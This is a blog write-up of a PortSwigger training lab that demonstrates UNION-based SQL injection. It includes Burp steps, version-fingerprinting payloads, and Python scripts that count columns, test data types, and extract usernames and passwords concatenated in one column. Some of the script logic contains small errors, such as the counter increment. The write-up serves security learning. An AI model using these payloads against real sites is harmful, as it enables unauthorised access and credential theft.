+++
title = "SQLi Vulnerabilities: Lab 6: SQL injection UNION attack, retrieving multiple values in a single column"
date = 2025-11-13
lastmod = 2025-11-13
draft = false
author = "bloodstiller"
description = "PortSwigger sqli lab write-up using a UNION Attack to exfiltrate data in a single column using python and burpsuite" 
tags = [
  "WebSecurity",
  "PortSwigger",
  "web-exploitation",
  "security-research",
  "portswigger-labs",
  "ctf-writeup",
  "injection",
  "sql",
  "sqli",
  "python",
  "UNION"
]
keywords = [
  "authentication vulnerabilities",
  "SQL",
  "SQLi",
  "PortSwigger authentication lab",
  "web security"
]
toc = true
bold = true
next = true
+++

## Lab 6: SQL injection UNION attack, retrieving multiple values in a single column: {#lab-6-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column}

> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
>
> The database contains a different table called users, with columns called username and password.
>
> To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.


### Initial Reconnaissance/Discovery: {#initial-reconnaissance-discovery}

We are given access to a simple web application which allows us to filter categories of products using the filters on the page, there is also a "My account" section.

{{< figure src="/ox-hugo/2025-11-13_10-14.png" >}}

We already know the "category" parameter is vulnerable based on the previous lab however let's re-verify this.


### Establishing SQLi: {#establishing-sqli}

If we send request to repeater we can inject a single quote `'` after the parameter and see we trigger a `500` response.
![](/ox-hugo/2025-11-13_06-49.png)

If then add a single another quote we can see that the page returns a `200` OK response.
![](/ox-hugo/2025-11-13_06-50.png)


### Inferring The SQL Query Being Run: {#inferring-the-sql-query-being-run}

Looking at the way the page we can infer the query being run is similar to the below.

```sql
SELECT * FROM products WHERE category = 'Pets' AND [rest of query]
```

When we add our single quote it becomes the below which is syntactically incorrect.

```sql
SELECT * FROM products WHERE category = 'Pets'' AND [rest of query]
```

However when we add another quote it becomes the below, closing off the first quotation mark we provided.

```sql
SELECT * FROM products WHERE category = 'Pets''' AND [rest of query]
```


### UNION SELECT Requirements: {#union-select-requirements}

As the lab wants us to retrieve data using a `UNION SELECT` query we also need to ensure that the two requirements for this attack are met:

1.  **The queries must return the same amount of columns**:
    This means that if the original query that is searching the database returns 5 columns our `UNION` query must also return 5 columns.
    -   **To solve this issue**: We will enumerate the number of columns being returned by the original query.

2.  **The data types in the columns must be compatible with each query**:
    This means that if the table is returning strings such as item names in column 1 our `UNION` query has to also return strings or a compatible data type.
    -   **To solve this issue**: Initially we will use a simple method of returning `NULL` values. This is because `NULL` is convertible/compatible to every data type, so it will mean that the payload should succeed. Once we have established our column count we will then start enumerating the data type of the columns &amp; eventually extract data.


### Establishing The Number Of Columns Using UNION SELECT Statement: {#establishing-the-number-of-columns-using-union-select-statement}


#### Using Burp: {#using-burp}

In order for us to display data we need to establish how many columns are in the existing database. 

If we return back to repeater we can enter the payload

```sql
' UNION SELECT NULL--
```

![](/ox-hugo/2025-11-13_06-52.png)
We then select the payload &amp; press `CTRL+U` to URL encode it.
![](/ox-hugo/2025-11-13_06-53.png)

If we send this payload we get a `500` response meaning the number of columns is not correct, so add another `NULL` so our payload and repeat the process.

```sql
' UNION SELECT NULL,NULL--
```

This time we get a `200` response so we know this particular table has 2 columns.
![](/ox-hugo/2025-11-13_06-54.png)

If we go to the browser and put our payload in we can actually see the additional row being rendered with no (`NULL`) values.
![](/ox-hugo/2025-11-13_10-18.png)


#### Using Python: {#using-python}

As usual I am going to show how this can also be solved using Python.


##### Prep The Certificate: {#prep-the-certificate}

If you want to proxy traffic through burp this is mandatory.

Open burp's in built web browser and go to <http://burpsuite> &amp; download the certificate by clicking on “CA Certificate” button on the top right corner.
![](/ox-hugo/2025-11-06_05-56.png)

Convert the certificate to the `.pem` format so the python requests module can use it.

```shell
openssl x509 -inform der -in certificate.cer -out certificate.pem
```


##### Imports: {#imports}

First we import the modules we will need, `requests` &amp; `os`. We also suppress the `requests` warning that will show.

```python
import requests
import os
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
```

If we didn't suppress the warnings the output would look like this.
![](/ox-hugo/2025-11-06_06-02.png)


##### Proxy Setup: {#proxy-setup}

Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.

```python
proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"
```


##### Variable Declaration: {#variable-declaration}

<!--list-separator-->

-  Proxies &amp; URL:

    We declare an array of proxies to proxy our requests through as well as the unique url &amp; category endpoint.
    ~~Note~~: The category and URL vary from instance to instance.

    ```python
    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    url="https://0aa9007a0350e042804fee0b002f0021.web-security-academy.net/filter?category=Gifts"
    ```

<!--list-separator-->

-  SQL Syntax &amp; Counters:

    So now we have our payload broken up into various elements, the reason for this is because we don't want to just supply a list of multiple `UNION SELECT` statements, doing it this way offers more flexibility as well as ensuring we don't repeat ourselves, it also means we could check databases with thousands of columns and it would still work.(I wouldn't advise that but you could)

    ```python
    union="' UNION SELECT "
    comma=","
    nullPayload="NULL"
    comment="--"
    additionalNull=comma+nullPayload
    payload=union+nullPayload
    counter=2
    ```

    We also create a `counter` variable and set it to `2`. This `counter` is used to track how many `NULL` values (columns) are in our `UNION SELECT` payload as we build it. Our starting payload is:

    ```python
    payload = union + nullPayload # "' UNION SELECT NULL"
    ```

    So before the loop runs we already have one `NULL` in the query. Inside the loop, we keep appending more `,NULL` values to `payload` and update `counter` to reflect the number of columns.

    We don’t start the `counter` at `0` because SQL columns are conceptually counted from 1 (first column, second column etc&#x2026;) and our payload already includes the first `NULL` column. If we started from 0, the value of `counter` would always lag behind the actual number of `NULL` columns in the query. By starting at `2`, the value of `counter` stays aligned with the true column count once we begin adding additional `NULL` values in the loop.


##### For Loop With Request: {#for-loop-with-request}

We declare a for loop will which repeat for 10 total iterations.

Then we have a `try` block which will send our get request to the `url` with `payload` &amp; `comment`.

**Response Monitoring**: We then monitor the responses and if the value "My account" is found in the body of the response we will:

-   Print the string `"Valid payload {payload}-- there are {counter} columns."` which will contain the actual payload as well as the number of columns.
-   Print the full Lab URL including comment and payload so we can easily verify it in a browser.

If these above conditions are met it will `break` out of the loop and stop the process.

If the above is not found it will add an additional `NULL` value using the `additionalNull` variable to the payload &amp; increment the `counter` by `1` and continue.

```python
for i in range(10):
    try:
        request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3)
        if 'My account' in request.text:
           print("---")
           print(f"Valid payload {payload}-- there are {counter} columns.")
           print(f"Lab Url: {url+payload+comment}")
           print("---")
           break
        payload=payload+additionalNull
        counter+=i
```


##### Error Handling: {#error-handling}

These `except` clauses are used for error handling to ensure if an error is encountered they are logged to the terminal and the process continues.

```python
    except requests.exceptions.HTTPError as errh:
        print ("Http Error:",errh)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
    except requests.exceptions.RequestException as err:
        print ("OOps: Something Else",err)
```


##### Full Script: {#full-script}

```python
#!/usr/bin/env python3
import requests
import os
import urllib.parse
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

url="https://0ae600e20460c97e847fd7ab000c0019.web-security-academy.net/filter?category=Gifts"

union="' UNION SELECT "
comma=","
nullPayload="NULL"
comment="--"
additionalNull=comma+nullPayload
payload=union+nullPayload
counter=2

for i in range(10):
    try:
        request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3)
        if 'My account' in request.text:
           print("---")
           print(f"Valid payload {payload}-- there are {counter} columns.")
           print(f"Lab Url: {url+payload+comment}")
           print("---")
        payload=payload+additionalNull
        counter+=i

    except requests.exceptions.HTTPError as errh:
        print ("Http Error:",errh)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
    except requests.exceptions.RequestException as err:
        print ("OOps: Something Else",err)
```


##### Running The Script: {#running-the-script}

As we can see it tells what we expect, there are 2 columns and the correction payload is:

```sql
' UNION SELECT NULL,NULL--
```

{{< figure src="/ox-hugo/2025-11-13_11-08.png" >}}


### Establishing Column Data Type VIA UNION SELECT Statement: {#establishing-column-data-type-via-union-select-statement}


#### Using Burp: {#using-burp}

Much like how we established the number of columns we can use repeater to determine the column data type.

We know to pass the lab we need to extract the administrators username &amp; password in a single column, then login. Typically usernames and passwords would be a string data type in the database. So to enumerate this we will systematically start replacing the `NULL` values of our payload with the string values `'a'`. This means our payload becomes:

```sql
'+UNION+SELECT+'a',NULL--
'+UNION+SELECT+NULL,'a'--
'+UNION+SELECT+'a','a'--
```

As we can the first column is not compatible with the string datatype as we get a `500` response.
![](/ox-hugo/2025-11-13_11-11.png)

We now modify our payload so the string value is in the second `NULL` position and revert the first position to be `NULL` again.

```sql
'+UNION+SELECT+NULL,'a'--
```

We can see this worked and the second position is compatible with the string datatype.
![](/ox-hugo/2025-11-13_11-12.png)


#### Using Python: {#using-python}

We can also do this in python by adding to our initial script. I have placed this in a diff block so you can see what we have added.

```diff
+compatible=0

for i in range(10):
    try:
        request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3)
        if 'My account' in request.text:
           print("---")
           print(f"Valid payload {payload}-- there are {counter} columns.")
           print(f"Lab Url: {url+payload+comment}")
           print("---")
+          payloadList=[nullPayload] * counter
+          for y in range(len(payloadList)):
+              if payloadList[y] == "NULL":
+                  payloadList[y] = "'string'"
+                  newPayload=(",".join(payloadList))
+                  request=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3)
+                  if 'My account' in request.text:
+                      print(f"Compatible data type found {union+newPayload+comment}")
+                      compatible+=1
+                      if compatible > 1:
+                          print(f"{compatible} compatible data type columns found, suggest combining payloads")
+                  payloadList[y] = "NULL"

        payload=payload+additionalNull
        counter+=i
```

**Compatible Variable**:
This is going to be used later on to print out a specific message if we find more than 1 compatible data type column so at the moment we set this with a value of `0`.

```python

```

**List Creation**:
We then create a `payloadList` that's contents is the value of `nullPayload` (which is "NULL") and this is equal to the value of the counter so if the counter is 2 then the list value is `['NULL', 'NULL']`

```python
payloadList=[nullPayload] * counter
```

**List Iteration**:

```python
if payloadList[y] == "NULL":
   payloadList[y] = "'string'"
```

We now iterate through the length of the list and if the value of `y` in the list is equal to `NULL` (which it will be) we replace that with the with a string called string. So on the first run it would `['string', NULL]`.

**New Payload Creation**:

```python
newPayload=(",".join(payloadList))
```

We then join our list together into a string so we can pass this to our request later, and we ensure we separate  with a comma `,` other wise our payload would be `"'string'NULLNULL"`

**Send our Request**:

```python
request=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3)
if 'My account' in request.text:
    print(f"Compatible data type found {union+newPayload+comment}")
```

Next we send our request like before but this time we are using our new payload. We also need to ensure we send the `"union"` variable as this is not currently present in our list/string/payloadstring.

We also perform the same type of check in the body of the request for the string "My account" which will signify that we have had a `200` OK response, and in this event it will print out the payload.

**Compatible Logic Counter**:
If the above conditions are met we increment our compatible counter by `1`. We then perform a check if the counter is greater than `1` and if it is we print out the total number of compatible data types found and suggest the user combine the payloads.

```python
compatible+=1
if compatible > 1:
    print(f"{compatible} compatible data type columns found, suggest combining payloads")
```

**Reset The `NULL` Value**:

```python
payloadList[y] = "NULL"
```

In the event that we do not get a `200` response we rest the list position `y` to be `NULL` again as other wise the list would just be full of the lab string.

As we can see when we run the script it prints out the compatible data type fields in position 1 &amp; 2 and also suggests we combine the payloads as they are both valid.
![](/ox-hugo/2025-11-13_11-16.png)


### Extracting Column Data VIA UNION SELECT Statement: {#extracting-column-data-via-union-select-statement}

We know there is a "users" table that has a "username" &amp; "password" column that we need to extract data from however we only have access to one column which has a compatible datatype, so how do we extract data?


#### Concatenating Values From Multiple Columns: {#concatenating-values-from-multiple-columns}

In order to retrieve multiple values within a single column we need to concatenate the values from each together and then output them to the single compatible column. Luckily for us we can use a separator like `:` so we can easily tell the two values apart.

In order for us to be able to use concatenation we need to establish what type of database in use as the syntax can be different for each type of database.

We can easily query the database type by using any of the below payloads:

```sql
--Oracle Pyaloads
' UNION SELECT NULL,SELECT banner FROM v$version--
' UNION SELECT NULL,version FROM v$instance--
--Microsoft Payloads
' UNION SELECT NULL,SELECT @@version--
--PostgreSQL Payload
' UNION SELECT NULL,version()--
--MySQL Payload
' UNION SELECT NULL,@@version--
```

We can see this database is PostgreSQL running on ubuntu.
![](/ox-hugo/2025-11-13_11-30.png)

This means we can use the following concatenation syntax.

```sql
'foo'||'bar'
```

This means our payload will be, this means it should output information in the following format `username:password`.

```sql
' UNION SELECT NULL,username || ':' || password FROM users--
```


#### Using Burp: {#using-burp}

Let's use the above query in burpsuite to extract the data.

```sql
' UNION SELECT NULL,username || ':' || password FROM users--
```

We can see this works and the username &amp; passwords for users are displayed as single strings in the existing content.
![](/ox-hugo/2025-11-13_11-33.png)

We can now login as the administrator to solve the lab.
![](/ox-hugo/2025-11-13_11-35.png)


#### Using Python: {#using-python}

We can also use python to extract the administrators password directly too.

**Additional Import**:
For us to parse and extract the administrators password we need the `BeautifulSoup` library and as we will be using regular expressions we need the `re` library.

```python
from bs4 import BeautifulSoup
import re
```

```python
def extractSQLusers():
    sqlPayload="' UNION SELECT NULL,username || ':' || password FROM users--"
    request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3)
    response=request.text
    if "administrator" in response:
        soup = BeautifulSoup(request.text, 'html.parser')
        administratorPass = soup.find(string=re.compile(r'^administrator'))
        print(f"The administrator credentials are: {administratorPass}")
        return True
    return False
```

**Function definition &amp; payload**
First we define the function called `extractSQLusers` we then declare our `sqlPayload`.

```python
def extractSQLusers():
    sqlPayload="' UNION SELECT NULL,username || ':' || password FROM users--"
```

**Send a request &amp; store the response**:
We send our payload and store the response in a variable called `response`.

```python
request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3)
response=request.text
```

**Parse response**:

```python
    if "administrator:" in response:
        soup = BeautifulSoup(request.text, 'html.parser')
        administratorPass = soup.find(string=re.compile(r'^administrator'))
        print(f"The administrator credentials are: {administratorPass}")
        return True
    return False
```

If we find the string "administrator" in the response this tells us the table of users has been returned.

We pass the HTML body from the HTTP response into beautiful soups HTML parser so it can turn the raw HTML into a structured object we can search through.

We then search through this HTML for the regular expression string `"^administrator"` which is searching for a string starting with the word "administrator", the reason we do this is we do not have two separate values, instead we have administrator username concatenated with the password string and a separator of `:`, meaning if we just searched for `"administrator"` nothing would show up as that string does not exist, however strings **start** with the word administrator.

We then print the value of this found string.

**Call the Function**:
We now call the function so it runs after our other conditions are satisfied.

```diff
  if 'My account' in request.text:
      print(f"Compatible data type found {union+newPayload+comment}")
      compatible+=1
+      if compatible > 0:
          print(f"{compatible} compatible data type columns found, suggest combining payloads")
+         extractSQLusers()
  payloadList[y] = "NULL"
```

~~Note~~: We changed the if compatible value from 1 to 0 so this will trigger.

As we can see it works when we run it and we are given the administrators password.
![](/ox-hugo/2025-11-13_11-42.png)


#### Whole Script: {#whole-script}

```python
#!/usr/bin/env python3
import requests
import os
import urllib.parse
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import re
proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

url="https://0ae600e20460c97e847fd7ab000c0019.web-security-academy.net/filter?category=Gifts"

union="' UNION SELECT "
comma=","
nullPayload="NULL"
comment="--"
additionalNull=comma+nullPayload
payload=union+nullPayload
counter=2
compatible=0

def extractSQLusers():
    sqlPayload="' UNION SELECT NULL,username || ':' || password FROM users--"
    request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3)
    response=request.text
    if "administrator" in response:
        soup = BeautifulSoup(request.text, 'html.parser')
        administratorPass = soup.find(string=re.compile(r'^administrator'))
        print(f"The administrator credentials are: {administratorPass}")
        return True
    return False

for i in range(10):
    try:
        request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3)
        if 'My account' in request.text:
           print("---")
           print(f"Valid payload {payload}-- there are {counter} columns.")
           print(f"Lab Url: {url+payload+comment}")
           print("---")
           payloadList=[nullPayload] * counter
           for y in range(len(payloadList)):
               if payloadList[y] == "NULL":
                   payloadList[y] = "'string'"
                   newPayload=(",".join(payloadList))
                   request=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3)
                   if 'My account' in request.text:
                       print(f"Compatible data type found {union+newPayload+comment}")
                       compatible+=1
                       if compatible > 0:
                           print(f"{compatible} compatible data type columns found, suggest combining payloads")
                           extractSQLusers()
                   payloadList[y] = "NULL"

        payload=payload+additionalNull
        counter+=i

    except requests.exceptions.HTTPError as errh:
        print ("Http Error:",errh)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
    except requests.exceptions.RequestException as err:
        print ("OOps: Something Else",err)



```
